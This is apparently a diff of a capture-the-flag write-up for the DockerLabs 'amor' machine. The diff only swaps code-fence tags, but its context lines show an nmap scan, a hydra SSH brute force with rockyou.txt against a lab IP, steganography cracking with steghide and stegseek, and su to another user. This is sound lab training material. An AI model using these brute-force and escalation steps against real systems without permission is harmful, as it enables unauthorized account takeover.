@@ -9,12 +9,11 @@ tags:
     - CTF
     - en
 ---
-
 # amor [dockerlabs]
 
 # Enumeration
 
-```jsx
+```bash
                                                                                               
 ┌──(root㉿kali)-[~/maquinas/amor]
 └─# nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn  $target -oG allPorts
@@ -106,7 +105,7 @@ Opened the page and read that there were 2 users mentioned: juan and carlota. Ju
 
 brute force using hydra ssh:
 
-```jsx
+```bash
                                                                                              
 ┌──(root㉿kali)-[~/maquinas/amor]
 └─# hydra -t 64 -l carlota -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -F -I
@@ -202,7 +201,7 @@ imagen.jpg
 
 ps aux didnt show any mail service and known locations for logs of emails werent present. upon inspecting the directories found an image, downloaded it and cracked
 
-```jsx
+```bash
                                                                                               
 ┌──(root㉿kali)-[~/maquinas/amor/content]
 └─# scp carlota@172.17.0.2:/home/carlota/Desktop/fotos/vacaciones/imagen.jpg .
@@ -230,7 +229,7 @@ stegseek is a cool tool to bruteforce images
 
 tried to extract more information with that pass, and also to use it to su oscar which was another user spotted under home
 
-```jsx
+```bash
                                                                                               
 ┌──(root㉿kali)-[~/maquinas/amor/content]
 └─# steghide --info imagen.jpg                          
@@ -251,7 +250,7 @@ converted the hash to base64 and used to su oscar
 
 # escalation
 
-```jsx
+```bash
 carlota@bc41026b0d64:~/Desktop/fotos/vacaciones$ su oscar
 Password: 
 $ bash
